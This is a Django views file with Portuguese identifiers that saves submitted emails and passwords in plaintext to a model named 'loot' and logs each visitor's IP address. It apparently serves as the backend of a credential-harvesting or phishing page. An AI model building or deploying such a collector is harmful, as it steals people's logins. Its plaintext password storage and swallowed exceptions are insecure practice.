import sqlite3

from django.shortcuts import render
from .models import loot, logip

# Create your views here.

def index(requests):
    try:
        email = requests.POST.get("email")
        senha = requests.POST.get("senha")

        ip = requests.META.get("REMOTE_ADDR")
        logar_ip = logip(ip=ip)
        logar_ip.save()

        try:
            if loot.objects.get(email=email):
                print("usuário existente.")
        except:
            inserir_usuario = loot(email=email, senha=senha)
            inserir_usuario.save()

    except Exception as e:
        print(e)

    return render(requests, "site/index.html")

def login(requests):
    usuario = requests.POST.get("email")
    senha = requests.POST.get("senha")

    try:
        if loot.objects.get(email=usuario, senha=senha):
            return render(requests, "logado/index.html")
        else:
            return render(requests, "login/index.html")
    except Exception as e:
        print(e)

    ip = requests.META.get("REMOTE_ADDR")
    logar_ip = logip(ip=ip)
    logar_ip.save()

    return render(requests, "login/index.html")
